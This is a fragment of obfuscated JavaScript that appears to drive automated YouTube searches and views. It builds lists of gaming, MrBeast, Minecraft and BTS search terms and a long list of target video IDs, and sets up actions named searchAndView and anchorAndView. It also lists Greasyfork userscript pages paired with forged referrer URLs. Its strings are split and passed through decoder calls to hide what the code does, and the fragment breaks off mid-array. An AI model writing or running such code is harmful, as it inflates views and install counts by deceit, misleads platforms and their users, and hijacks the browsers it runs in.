searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + V(0x0) + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x197a + -0x3e9 + 0x1d6d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x18e2 + -0x1 * 0x253c + -0x4 * -0x319)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + W(0x15, 'D2Dq') + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')[X(0x8)](',')), searchTerms = searchTerms['flat'](-0xb3c + 0x1d * 0x29 + 0x69a);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    X(0x19) + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    X(0x3) + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    X(0x1d) + 'U',
    X(0x18) + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    X(0x14) + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    X(0x1a) + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': V(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x13) + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + W(0xe, 'VBFs') + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': V(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + X(0x1) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': X(0x7) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
